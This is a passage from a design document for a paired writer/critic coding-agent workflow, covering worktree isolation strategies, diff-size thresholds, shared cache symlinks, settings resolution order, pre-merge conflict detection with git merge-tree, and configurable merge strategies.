change in a single PR nobody can review. Both are the same defect — a decision
that was never examined.

### 21.1 The plan states the strategy

In `mode=fix` the round plan carries a fourth section, `# Isolation Strategy`
(`# Стратегия изоляции`), and the plan gate refuses the move without it. In
`audit` it is not required: there are no commits, so there is nothing to
isolate.

The section declares one mode:

| mode | meaning | worktrees |
|---|---|---|
| `in-place` | the whole change is one slice on the round branch | 0 |
| `worktree` | one slice, in one isolated worktree | 1 |
| `decomposed` | the change is split into `slices` sequential slices | 0 or one per slice |

The declaration is the `mode:` field and only that. Prose is not a decision:
"No worktree is needed here" would otherwise declare a worktree, and "the branch
is round-147" would declare `in-place` — both from a sentence that said the
opposite. A fenced block is documentation, not a declaration.

### 21.2 The critic signs it

The strategy is part of the plan, so the critic's ordinary `plan-ack round N`
covers it. No second kind of visa is invented: the visa already answers "is this
plan agreed", and the strategy is in the plan. A worktree for a task of a
running round cannot be created without that visa — `worktree.setup_worktree`
refuses without one, and refuses when the agreed mode is `in-place`.

A **slice** is not a **worktree**. `decomposed` with `worktrees: 0` means
sequential slices on the round branch, which is what §19 asks for; `worktrees: N`
means one worktree per slice, which is what a parallel run needs. Claiming
worktrees that were never created would be a decoration, so the count the plan
declares is the count that was actually used.

### 21.3 The thresholds are checked against the fact

| size of the change | strategy |
|---|---|
| up to 50 changed lines | `in-place` |
| 51 to 300 changed lines | `worktree` |
| more than 300 changed lines | `decomposed` into 2-3 slices |

The thresholds are checked against the **measured diff**, never against what the
plan claimed. A declared "small fix" that turns into 400 lines is refused: the
rule against the promise is decoration, and a rule against the fact is a rule.

### 21.4 Two different worktrees

The launch environment of a pair and the isolation of a task inside a round are
different operations, and the gate differs because the question differs:

- **The launch environment** (`pairup --worktree`, `pair-duo --worktree`) exists
  before any round does. There is no round, no plan, no critic to sign
  anything, and no task whose isolation is being decided. The decision is the
  human's — they asked for it on the command line.
- **A task's worktree** exists during a round, to isolate one of its slices.
  That decision belongs to the writer, and the critic signs it.

### 21.5 The worktree dies with the branch

§19 makes a merged round branch die by construction. The directory that held it
dies with it: after a successful `bin/pairctl pr merge`, the worktree of the
merged branch is removed and the records are pruned. The main worktree is never
touched — the repository itself is not garbage.

A failed cleanup never turns a successful merge into a failure. The merge
already happened and cannot be undone, so an error there is recorded in the
transcript (`worktree_cleanup_failed`) and the command still reports success.
Silence would leave the reader unable to tell "there was nothing to clean" from
"the cleanup failed and nobody said so" — two states with different actions.

## 22. The three round disciplines: environment, conflict, strategy

Decided by both agents 2026-10-26 (round 148), continuing round 147's
worktree-first line. Three practices, each with one reason.

### 22.1 A worktree shares the project's caches

A worktree created from scratch has no `.venv` and no `node_modules`. Every
worktree therefore meant a full reinstall of the dependencies — the cost of
the isolation was paid in install time, every time.

The shared paths are a CLOSED list, never a glob: `.venv`, `node_modules`,
`.pytest_cache`, `__pycache__`, `dist`, `build`. A glob would share
everything under the tree, including the sources. The list is shared as
SYMLINKS into the main worktree, and a path is linked only when the source
exists and the target does not: a link to a place that is not there is a
broken link, and overwriting somebody's directory is data loss.

The setting follows §19's pattern for `trunk`: `PAIR_WORKTREE_SHARE` (the
environment) → `.pair/worktree-share` (local, ignored) →
`.pair-worktree-share` (the committed policy) → the closed list. A project
must not grow a second way of reading configuration.

### 22.2 One way to read a setting

`project_settings.py` is the ONE place that knows the order a project's
voice is heard in: the environment, the local ignored file, the committed
project file, the default. Each setting owns only the WHAT (which values
exist, what each one means) and asks the module for the WHERE.

Without it, each setting invents its own resolution order, and the project
ends up with three ways to read a setting — three places to look when a
round refuses for the "wrong" reason, and three chances for two of them to
disagree. The committed policy file is named `.pair-<name>`, the trunk's
name (`.pair-trunk`), so the local file and the committed one read as a
pair: `.pair/merge-strategy` and `.pair-merge-strategy`.

### 22.3 The conflict is found before the merge, not during

Round 147 gave the round branch a clean death: it was merged and deleted.
The conflict was discovered AT THE MOMENT OF THE MERGE — after the PR was on
review, after the critic had written a verdict, after the human had read the
diff. The cost of finding a conflict late is not the conflict; it is
everything that had to be un-done to find it.

So the question is asked earlier, and asked without touching the repository:
`git merge-tree --write-tree` computes the merge result in memory. The
index, the working tree and the history are exactly as they were.

The three answers are kept apart:

| answer | meaning |
|---|---|
| `clean` | the merge would succeed |
| `conflict` | it would not, and git names the files |
| `unknown` | git could not answer |

`unknown` is NOT `clean`. A gate that answers "no conflicts" when git failed
is worse than no gate at all: it says the thing the reader wants to hear,
without having checked anything.

The exit code alone does NOT tell these apart. `git merge-tree` exits 1 both
for a conflict AND for a revision it cannot resolve, and it exits 128 for
unrelated histories. The distinction is made on the OUTPUT: git prints the
sha of the merge result only when it actually computed a merge.

The file names are read from the NUL-separated form (`--name-only -z`), not
from git's prose: the prose is localized, and a host writing «Конфликт
слияния в f.txt» would leave an English-word parser with nothing.

The check compares the PR's HEAD — what the merge would ship — against
`origin/<trunk>`, with the trunk fetched FIRST (a check against a stale
trunk is a check against a fiction) and the head fetched by SHA if it is not
in this repository yet (the PR was pushed from elsewhere).

`--force` does NOT bypass it. `--force` bypasses the REVIEW gates; a
conflict is not a review gate, it is a fact about the two commits, and it
does not become true because a human wrote a reason next to it.

### 22.4 The merge strategy is a setting

The strategy was hard-wired: `gh pr merge --squash --delete-branch`. A
project that wanted its rounds rebased or merged as merge commits had no way
to ask for it except by editing the engine — which is not a setting.

`merge_strategy.py` follows §19's pattern for `trunk`:
`PAIR_MERGE_STRATEGY` (the environment) → `.pair/merge-strategy` (local,
ignored) → `.pair-merge-strategy` (the committed policy) → `squash`. The
default is what makes this safe to land: a project that says nothing keeps
the behaviour it had, byte for byte.

| strategy | `gh pr merge` flags |
|---|---|
| `squash` | `--squash --delete-branch` (the default) |
| `merge` | `--merge --delete-branch` |
| `rebase` | `--rebase --delete-branch` |

An invalid value is REFUSED with the admissible values named. It is never
silently replaced by the default: a project that asked for `rebase` and got
`squash` would learn it from the trunk's history, where nobody was looking.

`--delete-branch` is kept at every strategy: §19 requires the round's branch
to die with the round, whatever strategy brought it to the trunk.
